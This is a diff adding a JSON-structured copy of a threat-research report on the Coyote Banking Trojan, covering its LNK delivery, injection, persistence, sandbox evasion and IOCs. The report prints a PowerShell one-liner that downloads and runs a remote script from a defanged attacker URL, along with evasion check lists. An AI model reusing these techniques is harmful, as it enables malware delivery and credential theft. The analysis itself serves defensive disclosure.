@@ -1,0 +1,142 @@
+[
+    {
+        "level": 0,
+        "content": "Coyote Banking Trojan: A Stealthy Attack via LNK Files"
+    },
+    {
+        "level": 3,
+        "content": "Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Controls victim’s device and collects sensitive informationSeverity Level:High"
+    },
+    {
+        "level": 3,
+        "content": "Over the past month, FortiGuard Labs has identified several similar LNK files containing PowerShell commands designed to execute malicious scripts and connect to remote servers. These files are part of multi-stage operations that ultimately deliver the Coyote Banking Trojan. This malware primarily targets users in Brazil, seeking to harvest sensitive information from over 70 financial applications and numerous websites. Once deployed, the Coyote Banking Trojan can carry out various malicious activities, including keylogging, capturing screenshots, and displaying phishing overlays to steal sensitive credentials. In this article, we will detail the behavior of each stage."
+    },
+    {
+        "level": 1,
+        "content": "LNK File"
+    },
+    {
+        "level": 3,
+        "content": "The LNK file executes the following PowerShell command, which connects to a remote server to initiate the next stage: -w hid -noni -ep Bypass -c “Start-Job -Name PSSGR -ScriptBlock { IEX (iwr -Uri ‘hxxps://tbet[.]geontrigame[.]com/zxchzzmism’ -UseBasicParsing).Content }; Start-Sleep 131.”"
+    },
+    {
+        "level": 3,
+        "content": "We analyzed multiple malicious files by examining the “Machine ID” embedded within the LNK files. This unique identifier provides critical insights into the system where the LNK file originated. By extracting and analyzing this metadata, we traced connections to other malicious LNK files associated with Coyote."
+    },
+    {
+        "level": 3,
+        "content": "The content in “zxchzzmism” is an additional PowerShell script that holds two encoded data segments. This script employs specific commands to decode and execute the embedded shellcode, initiating the next phase of the malicious operation."
+    },
+    {
+        "level": 1,
+        "content": "Loader and Shellcode"
+    },
+    {
+        "level": 3,
+        "content": "The “bmwiMcDec” DLL file functions as a loader, utilizing VirtualAllocEx and WriteProcessMemory to inject the “npuGDec” payload. It then employs CreateRemoteThread to execute the injected malicious code, facilitating the continuation of the attack."
+    },
+    {
+        "level": 3,
+        "content": "The injected code leverages Donut, a tool designed to decrypt and execute the final MSIL (Microsoft Intermediate Language) payloads. This ensures seamless delivery and execution of the attack’s next stage."
+    },
+    {
+        "level": 3,
+        "content": "The decrypted MSIL execution file first establishes persistence by modifying the registry at “HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.” It checks for any existing PowerShell command in this registry entry. If found, it removes the existing entry and creates a new one with a randomly generated name. This new registry entry contains a customized PowerShell command pointing to download and execute a Base64-encoded URL, which facilitates the main functions of the Coyote Banking Trojan. The targeted URL for this operation is “hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw.”"
+    },
+    {
+        "level": 3,
+        "content": "If the victim is the new target, it gathers basic system information, such as the machine name, username, and operating system, and sends it to a remote server. It also identifies installed antivirus products by querying the SecurityCenter2 namespace in Windows Management Instrumentation (WMI). The collected data is then concatenated with a “|” separator, encoded in Base64, and the resulting string is reversed. This processed string is appended as a parameter and sent back to the remote server as follows: “hxxps://yezh[.]geontrigame[.]com/hqizjs/?l=y4CMuADfvJHUgATMgM3dvRmbpdFI0Z2bz9mcjlWT8JXZk5WZmVGRgM3dvRmbpdFfzlmcoNEf0IDR0Ul(omit).”"
+    },
+    {
+        "level": 3,
+        "content": "After setting and checking in, it calls “CreateProcess” to execute the PowerShell command that was added into the registry to invoke the payload:"
+    },
+    {
+        "level": 1,
+        "content": "Coyote Banking Trojan"
+    },
+    {
+        "level": 3,
+        "content": "The payload “vxewhcacbfqnsw” is similar to the one downloaded from the LNK file but is noticeably larger. This increase in size is due to the inclusion of the main Coyote Baking Trojan."
+    },
+    {
+        "level": 3,
+        "content": "We obtained the MSIL file after decrypting the payload from the Donut shellcode. It contained the following functions:"
+    },
+    {
+        "level": 3,
+        "content": "Username Checking: It examines the username to see if any of the following test/sandbox names are present: Johnson, Miller, malware, maltest, CurrentUser, Sandbox, virus, John Doe, test user, sand box, WDAGUtilityAccount, Bruno, George, and Harry Johnson. \nVirtual Management Tool Checking: It examines whether the environment contains files or folders related to virtual machines. It checks for strings in the directory “C:\\Windows\\System32” such as qemu-ga, qemuwmi, balloon.sys, netkvm.sys, vioinput, viofs.sys, and vioser.sys. \nBuild Targeting List: In this version, Coyote expands its target list to include 1,030 sites and 73 financial agents, including mercadobitcoin.com.br, bitcointrade.com.br, foxbit.com.br, augustoshotel.com.br, blumenhotelboutique.com.br, and fallshotel.com.br. It then starts monitoring the active window."
+    },
+    {
+        "level": 3,
+        "content": ""
+    },
+    {
+        "level": 3,
+        "content": "Communicate with C2: Coyote continuously monitors the active window to detect if the victim attempts to access any target sites. If a target site is accessed, it contacts the C2 server via port 443. The server list includes geraatualiza[.]com, masterdow[.]com, and geraupdate[.]com. Coyote reads a message from a remote server, processes it by decoding and cleaning the data, and prepares it for further actions based on the length of the first string in the message."
+    },
+    {
+        "level": 1,
+        "content": "Conclusion"
+    },
+    {
+        "level": 3,
+        "content": "Coyote's infection process is complex and multi-staged. This attack leveraged an LNK file for initial access, which subsequently led to the discovery of other malicious files. This Trojan poses a significant threat to financial cybersecurity, particularly because it has the potential to expand beyond its initial targets. Consequently, it highlights the critical need for robust security measures for both individuals and institutions to safeguard against evolving cyber threats."
+    },
+    {
+        "level": 2,
+        "content": "Fortinet Protections"
+    },
+    {
+        "level": 3,
+        "content": "The malware described in this report is detected and blocked byFortiGuard Antivirusas:"
+    },
+    {
+        "level": 3,
+        "content": "LNK/Agent.D!tr"
+    },
+    {
+        "level": 3,
+        "content": "FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected."
+    },
+    {
+        "level": 3,
+        "content": "TheFortiGuard Web FilteringService blocks the C2 server."
+    },
+    {
+        "level": 3,
+        "content": "We also suggest that organizations go through Fortinet’s free cybersecurity training module:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks."
+    },
+    {
+        "level": 3,
+        "content": "If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team."
+    },
+    {
+        "level": 1,
+        "content": "IOCs"
+    },
+    {
+        "level": 2,
+        "content": "URLs"
+    },
+    {
+        "level": 3,
+        "content": "hxxps://btee[.]geontrigame[.]com/mvkrouhawmjxxps://qmnw[.]daowsistem[.]com/fayikyeundhxxps://bhju[.]daowsistem[.]com/iwywybzqxkhxxps://lgfd[.]daowsistem[.]com/riqojhyvnrhxxps://leme[.]daowsistem[.]com/omzowcicwphxxps://igow[.]scortma[.]com/fqieghffbmhxxps://quit[.]scortma[.]com/xzcpnnfhxihxxps://llue[.]geontrigame[.]com/byyyfydxyfhxxps://cxmp[.]scortma[.]com/qfutdbtqquhxxps://xrxw[.]scortma[.]com/gmdroacyvihxxps://qfab[.]geontrigame[.]com/vfofnzihsmhxxps://tbet[.]geontrigame[.]com/zxchzzmismhxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw"
+    },
+    {
+        "level": 2,
+        "content": "Hosts"
+    },
+    {
+        "level": 3,
+        "content": "geraatualiza[.]commasterdow[.]comgeraupdate[.]com"
+    },
+    {
+        "level": 2,
+        "content": "Files"
+    },
+    {
+        "level": 3,
+        "content": "362af8118f437f9139556c59437544ae1489376dc4118027c24c8d5ce4d84e48330dffe834ebbe4042747bbe00b4575629ba8f2507bccf746763cacf63d655bb33cba89eeeaf139a798b7fa07ff6919dd0c4c6cf4106b659e4e56f15b5809287552d53f473096c55a3937c8512a06863133a97c3478ad6b1535e1976d1e0d45f64209e2348e6d503ee518459d0487d636639fa5e5298d28093a5ad41390ef6b067f371a683b2be4c8002f89492cd29d96dceabdbfd36641a27be761ee64605b173ad6be67691b65cee251d098f2541eef3cab2853ad509dac72d8eff5bd85bc07cbfbce482071c6df823f09d83c6868d0b1208e8ceb70147b64c52bb8b48bdb8839de445f714a32f36670b590eba7fc68b1115b885ac8d689d7b344189521012bea4f753707eba4088e8a51818d9de8e9ad0138495338402f05c5c7a800695a6f3c37b1de5983b30b9ae70c525f97727a56d3874533db1a6e3dc1355bfbf37ecfd0ef425d34b56d0bc08bd93e6ecb11541bd834b9d4d417187373b17055c862e"
+    }
+]
